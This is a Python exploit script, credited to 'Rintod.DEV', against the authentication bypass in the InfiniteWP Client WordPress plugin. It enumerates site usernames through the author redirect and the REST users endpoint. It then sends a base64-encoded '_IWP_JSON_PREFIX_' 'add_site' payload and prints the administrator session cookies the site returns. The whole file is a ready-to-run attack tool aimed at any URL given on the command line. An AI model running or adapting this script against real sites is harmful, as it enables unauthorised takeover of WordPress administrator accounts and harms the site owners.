## Reference: https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/
## Created By Rintod.DEV

#!/usr/bin/env python3

import requests
import re
import json
import base64
import sys
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class iWP_rintodDotDEV:
   
   def __init__(self, url):
      self.url = url
      self.username = None
      self.vuln = False
      self.cookies = None
      self.nonce = None
      self.headers = None
      
   def Enumeration(self):
      try:
         r = requests.get(self.url + "/?author=1", verify=False, allow_redirects=False)
         if r.status_code == 301:
            if "/author/" in r.headers:
               catch = re.findall(r"/author/(.*?)/", r.headers["Location"])[0]
               self.username = catch
               return True
            else:
               res = requests.get(self.url + "/wp-json/wp/v2/users", verify=False)
               if res.status_code == 200 and "slug" in res.text:
                  joke = json.loads(res.text)
                  self.username = str(joke[0]["slug"])
                  return True
               else:
                  return False
         else:
            res = requests.get(self.url + "/wp-json/wp/v2/users", verify=False)
            if res.status_code == 200 and "slug" in res.text:
               joke = json.loads(res.text)
               self.username = str(joke[0]["slug"])
               return True
            else:
               return False
      except Exception as e:
         print(str(e))

   def Payload(self):
      payload = base64.b64encode(json.dumps({
         "iwp_action": "add_site",
         "id": 1,
         "params": {
            "username": self.username
         }
      }).encode())
      self.payload = "_IWP_JSON_PREFIX_%s" % (payload.decode())

   def Headers(self):
      self.headers = {
         "User-Agent": "Mozilla",
         "Cookie": self.cookies
      }
   def Test(self):
      try:
         r = requests.post(self.url, data=self.payload, verify=False)
         if "<IWPHEADER>" in r.text:
            self.cookies = r.headers["set-cookie"]
            self.Headers()
            self.vuln = True
         else:
            self.vuln = False
      except Exception as e:
         print(str(e))
         
   def Exploit(self):
      try:
         print(colored("Targeting %s" % (self.url), "blue"))
         if self.Enumeration():
            print(colored("Get User Ok : %s" % (self.username), "green"))
            self.Payload()
            self.Test()
            if self.vuln:
               print(colored("Target is vuln", "green"))
               print(colored("Getting Cookies", "yellow"))
               if self.headers is not None:
                  print(colored(self.cookies, "blue"))
               else:
                  print(colored("Cant get cookies", "red"))
            else:
               print(colored("Target Not Vuln", "red"))
         else:
            print(colored("Cant get user", "red"))
      except Exception as e:
         print(str(e))
         
      
            
if __name__ == "__main__":
   oi = iWP_rintodDotDEV(sys.argv[1])
   oi.Exploit()
